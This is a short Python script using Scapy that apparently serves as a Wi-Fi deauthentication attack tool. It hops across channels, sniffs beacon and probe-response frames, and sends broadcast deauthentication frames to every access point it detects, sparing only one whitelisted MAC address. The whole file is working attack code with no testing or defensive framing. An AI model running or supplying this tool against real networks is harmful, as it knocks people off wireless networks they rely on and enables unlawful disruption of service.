#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse, random, time, os, sys, signal
from scapy.all import *
from multiprocessing import Process

inteface   = ''
count      = 6
white_list = ['48:5b:39:85:ae:52'] 

def packet_sniffer():
    pkt     = sniff(iface=interface, timeout=1, lfilter= lambda x: x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp))
    u_pkt   = []
    u_addr2 = []

    for p in pkt:
        if p.addr2 not in u_addr2:
            u_pkt.append(p)
            u_addr2.append(p.addr2)

    return u_pkt

def deauth(pkt):
    bssid   = pkt.addr2
    essid   = pkt[Dot11Elt].info
    channel = ord(pkt[Dot11Elt:3].info)
    client  = 'ff:ff:ff:ff:ff:ff'

    if pkt.addr2 not in white_list:
        os.system("iw dev %s set channel %d" % (interface, channel))
        print "sending deauth packets for %s, channel %d..." % (essid, channel)
        sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=pkt.addr3)/Dot11Deauth(), count=count, iface=interface, verbose=0)
    else:
        print "%s in white list... ignoring" % (essid)

def channel_hopper():
    while True:
        for channel in range(10,13):
            os.system("iw dev %s set channel %d" % (interface, channel))
            time.sleep(0.5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='deauth scapy')
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='interface to use')
    parser.add_argument('-c', '--count', dest='count', type=int, required=False, help='count packets')

    args = parser.parse_args()

    interface = args.interface
    count     = args.count

    #os.system("ifconfig %s down" % interface)
    #os.system("iwconfig %s mode monitor" % interface)
    #os.system("ifconfig %s up" % interface)

    while True:
        try:
            hop = Process(target=channel_hopper)
            hop.start()

            pkt_ssid = packet_sniffer()

            hop.terminate()

            for pkt in pkt_ssid:
                deauth(pkt)
        except KeyboardInterrupt:
            sys.exit(0)
